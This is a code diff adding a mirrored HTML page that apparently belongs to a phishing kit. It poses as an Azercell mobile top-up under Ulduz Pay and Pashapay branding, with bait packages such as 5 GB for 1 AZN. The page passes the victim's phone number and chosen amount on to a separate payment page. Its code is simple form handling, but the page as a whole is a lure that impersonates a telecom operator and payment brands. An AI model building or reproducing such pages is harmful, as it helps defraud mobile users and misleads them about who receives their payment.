@@ -1,0 +1,400 @@
+
+<!DOCTYPE html>
+<html lang="az">
+
+
+<!-- Mirrored from millionngb.com/mebleg.php?number= by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 19 Jun 2026 18:32:34 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Məbləğ</title>
+
+    <link rel="stylesheet"
+        href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <style>
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+        }
+
+        body{
+            font-family:Arial, Helvetica, sans-serif;
+            background:#dedee6;
+            min-height:100vh;
+            color:#0d2340;
+        }
+
+        .page{
+            width:100%;
+            max-width:460px;
+            margin:0 auto;
+            min-height:100vh;
+            display:flex;
+            flex-direction:column;
+            padding:0 12px;
+        }
+
+        .logo-wrap{
+            text-align:center;
+            padding:10px 0 54px;
+        }
+
+        .logo-wrap img{
+            width:160px;
+        }
+
+        .card{
+            background:#fff;
+            border-radius:14px;
+            padding:36px 26px 32px;
+            border:1px solid #e9e9ee;
+        }
+
+        .title{
+            font-size:22px;
+            font-weight:800;
+            margin-bottom:31px;
+            color:#071a33;
+        }
+
+        .number-row{
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            padding-bottom:11px;
+            border-bottom:1px solid #dfe3ea;
+            margin-bottom:18px;
+        }
+
+        .number-label{
+            font-size:15px;
+            color:#657188;
+        }
+
+        .number-value{
+            font-size:15px;
+            font-weight:800;
+            color:#000;
+        }
+
+        .choose-text{
+            font-size:14px;
+            color:#657188;
+            margin-bottom:17px;
+        }
+
+        .package-list{
+            display:flex;
+            flex-direction:column;
+            gap:13px;
+        }
+
+        .package{
+            min-height:64px;
+            border:1px solid #eceef3;
+            border-radius:10px;
+            background:#fafafa;
+            display:flex;
+            align-items:center;
+            padding:0 14px;
+            cursor:pointer;
+        }
+
+        .package input{
+            width:19px;
+            height:19px;
+            margin-right:17px;
+            accent-color:#0d6efd;
+            flex-shrink:0;
+        }
+
+        .package-price{
+            font-size:18px;
+            font-weight:800;
+            color:#00a844;
+            margin-right:8px;
+            white-space:nowrap;
+            flex-shrink:0;
+        }
+
+        .package-text{
+            font-size:13px;
+            color:#10213f;
+            white-space:nowrap;
+        }
+
+        .actions{
+            display:flex;
+            gap:16px;
+            margin-top:31px;
+        }
+
+        .btn{
+            flex:1;
+            height:51px;
+            border-radius:5px;
+            border:1px solid #cfd3da;
+            background:#fff;
+            font-size:15px;
+            cursor:pointer;
+        }
+
+        .btn-back{
+            color:#000;
+        }
+
+        .btn-primary{
+            background:#8dc0f4;
+            border:none;
+            color:#fff;
+            font-weight:800;
+            cursor:not-allowed;
+        }
+
+        .btn-primary.active{
+            background:#0d6efd;
+            cursor:pointer;
+        }
+
+        .footer{
+            margin-top:auto;
+            background:#fff;
+            margin-left:-12px;
+            margin-right:-12px;
+            padding:36px 0 22px;
+            text-align:center;
+        }
+
+        .footer-text{
+            color:#657188;
+            font-size:14px;
+            font-weight:700;
+        }
+
+        .footer-icons{
+            margin-top:18px;
+            display:flex;
+            justify-content:center;
+            gap:22px;
+            font-size:21px;
+        }
+
+        .footer-icons i{
+            color:#99a1b1;
+            cursor:default;
+            transition:.2s;
+        }
+
+        .footer-icons .fa-facebook:hover{
+            color:#1877f2;
+        }
+
+        .footer-icons .fa-instagram:hover{
+            color:#e1306c;
+        }
+
+        .footer-icons .fa-telegram:hover{
+            color:#229ED9;
+        }
+
+        @media(max-width:480px){
+
+            .page{
+                padding:0 10px;
+            }
+
+            .card{
+                padding:32px 18px 28px;
+            }
+
+            .package-text{
+                white-space:normal;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="page">
+
+    <div class="logo-wrap">
+        <img src="ulduzpay.jpg" alt="Ulduz Pay Logo" style="max-width: 200px; margin: 0 auto; display: block;">
+    </div>
+
+    <div class="card">
+
+        <div class="title" id="operatorName">
+            Azercell        </div>
+
+        <div class="number-row">
+            <div class="number-label">Nömrə:</div>
+            <div class="number-value" id="phoneNumber">
+                            </div>
+        </div>
+
+        <form action="odeme.html" method="GET">
+
+            <input type="hidden"
+                name="op"
+                value="Azercell">
+
+            <input type="hidden"
+                name="number"
+                value="">
+
+            <input type="hidden"
+                name="amount"
+                id="amount">
+
+            <div class="choose-text">
+                Münasib paketi seçin:
+            </div>
+
+            <div class="package-list">
+
+                
+                <label class="package">
+
+                    <input type="radio"
+                        name="package"
+                        value="1"
+                        onchange="selectPackage(this)">
+
+                    <span class="package-price">
+                        1 AZN
+                    </span>
+
+                    <span class="package-text">
+                        5 GB + 80 dəqiqə danışıq (7 gün)                    </span>
+
+                </label>
+
+                
+                <label class="package">
+
+                    <input type="radio"
+                        name="package"
+                        value="5"
+                        onchange="selectPackage(this)">
+
+                    <span class="package-price">
+                        5 AZN
+                    </span>
+
+                    <span class="package-text">
+                        15 GB + 150 dəqiqə danışıq (20 gün)                    </span>
+
+                </label>
+
+                
+                <label class="package">
+
+                    <input type="radio"
+                        name="package"
+                        value="10"
+                        onchange="selectPackage(this)">
+
+                    <span class="package-price">
+                        10 AZN
+                    </span>
+
+                    <span class="package-text">
+                        30 GB + 200 dəqiqə danışıq (30 gün)                    </span>
+
+                </label>
+
+                
+                <label class="package">
+
+                    <input type="radio"
+                        name="package"
+                        value="20"
+                        onchange="selectPackage(this)">
+
+                    <span class="package-price">
+                        20 AZN
+                    </span>
+
+                    <span class="package-text">
+                        60 GB + 300 dəqiqə danışıq (60 gün)                    </span>
+
+                </label>
+
+                
+            </div>
+
+            <div class="actions">
+
+                <button type="button"
+                    class="btn btn-back"
+                    onclick="history.back()">
+                    Geri
+                </button>
+
+                <button type="submit"
+                    class="btn btn-primary"
+                    id="continueBtn"
+                    disabled>
+                    DAVAM ET
+                </button>
+
+            </div>
+
+        </form>
+
+    </div>
+
+    <div class="footer">
+
+        <div class="footer-text">
+            Pashapay 2026 © Bütün hüquqlar qorunur
+        </div>
+
+        <div class="footer-icons">
+            <i class="fab fa-facebook"></i>
+            <i class="fab fa-instagram"></i>
+            <i class="fab fa-telegram"></i>
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+
+// URL parametrelerini oku
+window.addEventListener('DOMContentLoaded', function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const operator = urlParams.get('op') || 'Azercell';
+    const number = urlParams.get('number') || '';
+    
+    // Operator ve numara bilgilerini göster
+    document.getElementById('operatorName').textContent = operator;
+    document.getElementById('phoneNumber').textContent = number;
+    
+    // Hidden inputları güncelle
+    document.querySelector('input[name="op"]').value = operator;
+    document.querySelector('input[name="number"]').value = number;
+});
+
+function selectPackage(input){
+
+    document.getElementById('amount').value = input.value;
+
+    const btn = document.getElementById('continueBtn');
+
+    btn.disabled = false;
+
+    btn.classList.add('active');
+}
+
+</script>
+
+</body>
+
+<!-- Mirrored from millionngb.com/mebleg.php?number= by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 19 Jun 2026 18:32:34 GMT -->
+</html>
